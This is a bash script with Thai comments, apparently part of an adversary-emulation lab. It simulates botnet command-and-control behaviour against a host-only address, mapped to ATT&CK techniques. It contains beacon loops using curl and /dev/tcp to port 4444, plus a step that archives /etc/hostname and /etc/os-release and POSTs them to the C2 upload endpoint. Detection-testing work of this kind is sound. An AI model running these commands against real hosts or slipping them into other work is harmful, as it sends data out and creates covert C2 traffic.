#!/usr/bin/env bash
# botnet.sh - จำลองพฤติกรรม botnet / C2 beaconing
# ATT&CK: T1071.001 (Web Protocols), T1105 (Ingress Tool Transfer),
#         T1571 (Non-Standard Port), T1016 (Network Config Discovery),
#         T1018 (Remote System Discovery)
#
# C2 ในที่นี้ = host machine (192.168.56.1) ไม่ใช่เซิร์ฟเวอร์จริงภายนอก
set -uo pipefail
source "$(dirname "$0")/_lib.sh"
banner "botnet"
setup_sandbox

C2_HOST="${C2_HOST:-192.168.56.1}"
C2_PORT="${C2_PORT:-8080}"
BOT="$SANDBOX/bot"
mkdir -p "$BOT"

# --- Stage 1: สำรวจเครือข่าย (T1016, T1018, T1049) ---
atomic T1016
atomic T1049

# --- Stage 2: beaconing ไป C2 จำลอง (สร้าง NetworkConnect เยอะ) ---
echo "[botnet] beacon ไป $C2_HOST:$C2_PORT"
for i in $(seq 1 15); do
    curl -s -m 2 "http://$C2_HOST:$C2_PORT/beacon?id=bot$i" \
         -o "$BOT/resp_$i.txt" 2>/dev/null || true
    # beacon ผ่าน port ผิดปกติ (T1571)
    timeout 2 bash -c "echo 'ping' > /dev/tcp/$C2_HOST/4444" 2>/dev/null || true
    sleep 3
done

# --- Stage 3: application layer protocol (T1071.001) ---
atomic T1071.001

# --- Stage 4: ดาวน์โหลดเครื่องมือเพิ่ม (T1105) ---
atomic T1105

# --- Stage 5: exfiltration จำลอง ---
echo "[botnet] จำลอง exfiltration"
tar -czf "$BOT/stolen.tar.gz" /etc/hostname /etc/os-release 2>/dev/null
curl -s -m 3 -X POST -F "file=@$BOT/stolen.tar.gz" \
     "http://$C2_HOST:$C2_PORT/upload" 2>/dev/null || true

done_banner "botnet"